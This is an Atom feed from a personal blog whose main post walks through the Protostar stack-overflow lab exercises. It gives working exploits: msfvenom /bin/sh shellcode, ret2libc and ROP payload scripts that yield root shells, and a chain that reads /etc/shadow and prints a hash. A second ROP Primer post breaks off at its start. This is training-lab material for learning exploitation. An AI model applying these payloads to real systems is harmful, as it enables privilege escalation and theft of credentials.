<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[tcunha.github.io]]></title>
  <link href="http://tcunha.github.io/atom.xml" rel="self"/>
  <link href="http://tcunha.github.io/"/>
  <updated>2015-12-29T20:17:09+00:00</updated>
  <id>http://tcunha.github.io/</id>
  <author>
    <name><![CDATA[tcunha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Protostar Stack]]></title>
    <link href="http://tcunha.github.io/blog/2015/12/29/protostar-stack/"/>
    <updated>2015-12-29T18:58:57+00:00</updated>
    <id>http://tcunha.github.io/blog/2015/12/29/protostar-stack</id>
    <content type="html"><![CDATA[<h2>stack0</h2>

<p>Nice refresher with regards to the volatile type qualifier. It is needed to
prevent the compiler from optimizing it away, given that it&rsquo;s &ldquo;always&rdquo; set to
zero (it might remove the if condition altogether). This is specially true for
signal handlers:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">sig_atomic_t</span>    <span class="n">quit</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>  <span class="cm">/* Needs volatile! */</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span>
</span><span class='line'><span class="nf">sigterm</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">quit</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="p">(</span><span class="n">quit</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* This might be transformed to while (true). */</span>
</span><span class='line'>  <span class="p">...</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Given that the buffer is 64 bytes in size and the stack layout, writing one more
will copy one over modified:</p>

<pre><code>H +-------------+
  | ...         |
  | modified    |
  | buffer[64]  |   /* Being power of two means that it's aligned. */
  | ...         |
L +-------------+
</code></pre>

<p>To trigger the condition, the following command can be issued:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;1&quot; * 65&#39;</span><span class="p">|</span>./stack0
</span><span class='line'><span class="go">you have changed the &#39;modified&#39; variable</span>
</span></code></pre></td></tr></table></div></figure>


<h2>stack1</h2>

<p>Like the above, given that the address of modified is four bytes above the
buffer and (like the exercise says) by taking into account that this is a little
endian platform (i386):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> ./stack1 <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;A&quot; * 64 + &quot;\x64\x63\x62\x61&quot;&#39;</span><span class="sb">`</span>  <span class="c"># or,</span>
</span><span class='line'><span class="go">you have correctly got the variable to the right value</span>
</span><span class='line'><span class="gp">$</span> ./stack1 <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;A&quot; * 64 + &quot;dcba&quot;&#39;</span><span class="sb">`</span>
</span><span class='line'><span class="go">you have correctly got the variable to the right value</span>
</span></code></pre></td></tr></table></div></figure>


<h2>stack2</h2>

<p>The same as the last one but with an environment variable:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> env <span class="nv">GREENIE</span><span class="o">=</span><span class="s2">&quot;`python -c &#39;print &quot;</span>A<span class="s2">&quot; * 64 + &quot;</span><span class="se">\x</span>0a<span class="se">\x</span>0d<span class="se">\x</span>0a<span class="se">\x</span>0d<span class="s2">&quot;&#39;`&quot;</span> ./stack2
</span><span class='line'><span class="go">you have correctly modified the variable</span>
</span></code></pre></td></tr></table></div></figure>


<h2>stack3</h2>

<p>Disassembling, like the exercise says, with objdump and retrieving the address
of the win() function yields the expected results:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x">$ objdump -d stack3|grep win</span>
</span><span class='line'><span class="mh">08048424</span> <span class="p">&lt;</span><span class="nf">win</span><span class="p">&gt;:</span>
</span></code></pre></td></tr></table></div></figure>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;A&quot; * 64 + &quot;\x24\x84\x04\x08&quot;&#39;</span><span class="p">|</span>./stack3
</span><span class='line'><span class="go">calling function pointer, jumping to 0x08048424</span>
</span><span class='line'><span class="go">code flow successfully changed</span>
</span></code></pre></td></tr></table></div></figure>


<h2>stack4</h2>

<p>A poor man&rsquo;s fuzzer can be used to guess the EIP address (and while at it, to
take advantage of the redirect operator in gdb, like the exercise says):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;A&quot; * offset + &quot;B&quot; * 4&#39;</span> &gt;/tmp/dump
</span><span class='line'><span class="gp">$</span> gdb ./stack4
</span><span class='line'><span class="go">(gdb) r &lt;/tmp/dump</span>
</span></code></pre></td></tr></table></div></figure>


<p>The offset should be incremented until (76) the program crashes with a segfault
in the 0x42424242 address. Now that EIP is under control, the above can be used
to obtain the address of win:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='objdump'><span class='line'><span class="x">$ objdump -d stack4|grep win</span>
</span><span class='line'><span class="mh">080483f4</span> <span class="p">&lt;</span><span class="nf">win</span><span class="p">&gt;:</span>
</span></code></pre></td></tr></table></div></figure>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;A&quot; * 76 + &quot;\xf4\x83\x04\x08&quot;&#39;</span><span class="p">|</span>./stack4
</span><span class='line'><span class="go">code flow successfully changed</span>
</span><span class='line'><span class="go">Segmentation fault</span>
</span></code></pre></td></tr></table></div></figure>


<p>The padding, like the exercise says, is added by the compiler.</p>

<h2>stack5</h2>

<p>This was kind of tricky, since the stack isn&rsquo;t in the same place inside and
outside GDB. The environment and the arguments vector (ie argv) must be the
same.</p>

<p>First, brute-forced the number of bytes needed to overwrite EIP (76 in this
case) and obtained the address of the stack with GDB:</p>

<pre><code>$ python -c 'print "A" * 76 + "B" * 4 + "C" * 32' &gt;/tmp/boom
$ env - TERM=xterm PWD=$PWD gdb /opt/protostar/bin/stack5
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env
TERM=xterm
PWD=/tmp
(gdb) r &lt;/tmp/boom
(gdb) info registers
(gdb) x/x $esp
0xbffffe30: 0x43434343
</code></pre>

<p>Generated the shellcode with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> msfvenom -p linux/x86/exec -f py -a x86 --platform linux <span class="nv">CMD</span><span class="o">=</span>/bin/sh
</span><span class='line'><span class="go">No encoder or badchars specified, outputting raw payload</span>
</span><span class='line'><span class="go">Payload size: 43 bytes</span>
</span><span class='line'><span class="go">buf =  &quot;&quot;</span>
</span><span class='line'><span class="go">buf += &quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f&quot;</span>
</span><span class='line'><span class="go">buf += &quot;\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08&quot;</span>
</span><span class='line'><span class="go">buf += &quot;\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53&quot;</span>
</span><span class='line'><span class="go">buf += &quot;\x89\xe1\xcd\x80&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>As for the exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">76</span>
</span><span class='line'><span class="n">esp</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbffffe30</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span>  <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">buf</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x89\xe1\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">esp</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, ensure that the environment is the same as the above (without changing
directories due to $PWD):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>   <span class="se">\</span>
</span><span class='line'><span class="go">  env - TERM=xterm PWD=$PWD     \</span>
</span><span class='line'><span class="go">  /opt/protostar/bin/stack5</span>
</span><span class='line'><span class="go">id</span>
</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
</span></code></pre></td></tr></table></div></figure>


<h2>stack6</h2>

<p>With the usual methodology, it was noticed that EIP is under control when
overwriting at least eighty characters. The traditional ret2libc with the
system function and faking a stack frame works as expected:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">80</span>
</span><span class='line'><span class="n">sys</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">)</span>    <span class="c"># system(3)</span>
</span><span class='line'><span class="n">sh</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffb8</span><span class="p">)</span>     <span class="c"># /bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sys</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;FAKE&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sh</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>The /bin/sh address might need the usual guessing and setting a regular
environment inside and outside GDB:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>                   <span class="se">\</span>
</span><span class='line'><span class="go">  env - SHELL=/bin/sh TERM=xterm PWD=$PWD       \</span>
</span><span class='line'><span class="go">  /opt/protostar/bin/stack6</span>
</span><span class='line'><span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAA��AKE����</span>
</span><span class='line'><span class="go">id</span>
</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
</span></code></pre></td></tr></table></div></figure>


<p>As for the ROP one, I&rsquo;ve opted by using a rather pointless open(2), read(2),
write(2) and finally system(3) chain to play around a little. The gadgets
addresses can be obtained by using objdump. Jumping to the middle of a multiple
pop sequence might be needed and that&rsquo;s okay.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">80</span>
</span><span class='line'>
</span><span class='line'><span class="c"># int open(const char *, int);</span>
</span><span class='line'><span class="n">openaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7f537a0</span><span class="p">)</span>
</span><span class='line'><span class="n">pop2</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048452</span><span class="p">)</span>
</span><span class='line'><span class="n">openpath</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffd6</span><span class="p">)</span>       <span class="c"># SHADOW variable.</span>
</span><span class='line'><span class="n">openflgs</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>              <span class="c"># O_RDONLY</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ssize_t read(int, void *, size_t);</span>
</span><span class='line'><span class="n">readaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7f53c00</span><span class="p">)</span>
</span><span class='line'><span class="n">pop3</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x08048576</span><span class="p">)</span>
</span><span class='line'><span class="n">readfd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">)</span>                <span class="c"># Only the standard ones are open.</span>
</span><span class='line'><span class="n">readbuf</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbffff73c</span><span class="p">)</span>        <span class="c"># getpath() buffer.</span>
</span><span class='line'><span class="n">readcnt</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>              <span class="c"># 64 bytes.</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ssize_t write(int, const void *, size_t);</span>
</span><span class='line'><span class="n">writeaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7f53c70</span><span class="p">)</span>
</span><span class='line'><span class="n">writefd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">)</span>               <span class="c"># stderr is unbuffered.</span>
</span><span class='line'><span class="n">writebuf</span> <span class="o">=</span> <span class="n">readbuf</span>
</span><span class='line'><span class="n">writecnt</span> <span class="o">=</span> <span class="n">readcnt</span>
</span><span class='line'>
</span><span class='line'><span class="c"># int system(const char *);</span>
</span><span class='line'><span class="n">sysaddr</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">)</span>
</span><span class='line'><span class="n">pointless</span> <span class="o">=</span> <span class="s">&quot;FAKE&quot;</span>
</span><span class='line'><span class="n">syscmd</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffc7</span><span class="p">)</span>         <span class="c"># SHELL variable.</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">openaddr</span> <span class="o">+</span> <span class="n">pop2</span> <span class="o">+</span> <span class="n">openpath</span> <span class="o">+</span> <span class="n">openflgs</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">readaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">readfd</span> <span class="o">+</span> <span class="n">readbuf</span> <span class="o">+</span> <span class="n">readcnt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">writeaddr</span> <span class="o">+</span> <span class="n">pop3</span> <span class="o">+</span> <span class="n">writefd</span> <span class="o">+</span> <span class="n">writebuf</span> <span class="o">+</span> <span class="n">writecnt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sysaddr</span> <span class="o">+</span> <span class="n">pointless</span> <span class="o">+</span> <span class="n">syscmd</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>Beware that the environment inherited from the parent may play tricks due to not
being the same. Executing it through a clean environment all the time, such as
the one below, solves this kind of issues:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>                                  <span class="se">\</span>
</span><span class='line'><span class="go">  env - TERM=xterm PWD=$PWD SHELL=/bin/sh SHADOW=/etc/shadow   \</span>
</span><span class='line'><span class="go">  /opt/protostar/bin/stack6</span>
</span><span class='line'><span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�7��AAAAAAAAAAAA�7��R��</span>
</span><span class='line'><span class="gp">root:$6$gOA4/iAf$</span>EMw.4yshZLZxjlf./VmnEVQ20QsEmdzZa73csPGYGG6KC.rid
</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The stack with the above ROP will look like:</p>

<pre><code>H +---------------------+
  | ret (the variable)  |
  | buffer [0x41 * 80]  | &lt;= 0xbffff73c
  | open(2)             | &lt;= 0xb7f537a0
  | POP POP RET         | &lt;= 0x08048452
  | /etc/shadow         | &lt;= SHADOW variable.
  | openflgs            | &lt;= O_RDONLY
  | read(2)             | &lt;= 0xb7f53c00
  | POP POP POP RET     | &lt;= 0x08048576
  | 0x3                 |
  | buffer              | &lt;= 0xbffff73c
  | 0x40                |
  | write(2)            | &lt;= 0xb7f53c70
  | POP POP POP RET     | &lt;= 0x08048576
  | 0x2                 |
  | buffer              | &lt;= 0xbffff73c
  | 0x40                |
  | system(3)           | &lt;= 0xb7ecffb0
  | FAKE                |
  | /bin/sh             | &lt;= SHELL variable.
L +---------------------+
</code></pre>

<h2>stack7</h2>

<p>Like the one above, this also places restrictions in the address that we are
allowed to jump to. Therefore, like the exercise says we need to bypass this
restriction by returning to a text section.</p>

<p>Decided with a straight ret opcode one, that pops the last value from the stack
and updates EIP to that address (the system(3) function).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
</span><span class='line'>
</span><span class='line'><span class="n">off</span> <span class="o">=</span> <span class="mi">80</span>
</span><span class='line'><span class="n">ret</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0x080484c2</span><span class="p">)</span>    <span class="c"># the ret instruction (frame_dummy)</span>
</span><span class='line'><span class="n">sys</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">)</span>    <span class="c"># system(3)</span>
</span><span class='line'><span class="n">sh</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="mh">0xbfffffbd</span><span class="p">)</span>     <span class="c"># /bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="n">off</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sys</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;FAKE&quot;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">sh</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">$</span> <span class="o">(</span>python /tmp/boom.py<span class="p">;</span> cat<span class="o">)</span><span class="p">|</span>                   <span class="se">\</span>
</span><span class='line'><span class="go">  env - TERM=xterm PWD=$PWD SHELL=/bin/sh       \</span>
</span><span class='line'><span class="go">  /opt/protostar/bin/stack7</span>
</span><span class='line'><span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AKE��</span>
</span><span class='line'><span class="go">id</span>
</span><span class='line'><span class="go">uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ROP Primer: 0.2]]></title>
    <link href="http://tcunha.github.io/blog/2015/11/12/rop-primer-0-dot-2/"/>
    <updated>2015-11-12T01:31:07+00:00</updated>
    <id>http://tcunha.github.io/blog/2015/11/12/rop-primer-0-dot-2</id>
    <content type="html"><![CDATA[<h2>level0</h2>

<p>Started, as usual, by fetching the number of characters needed to overflow the
name. The regular MSF pattern-create (or its alternatives like peda) approach
can be used. In this case consider that 44 bytes are needed to overflow.</p>

<p>The system(3) function doesn&rsquo;t seem to be linked in the library. On purpose,
most likely. One can use the mprotect(2) system call to bypass the NX protection
(which isn&rsquo;t allowed under PaX) on the stack by making a small portion of its
pages as executable and read a shellcode into that location from standard input.</p>

<p>The Python code below was used to create two additional (fake) stack frames:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
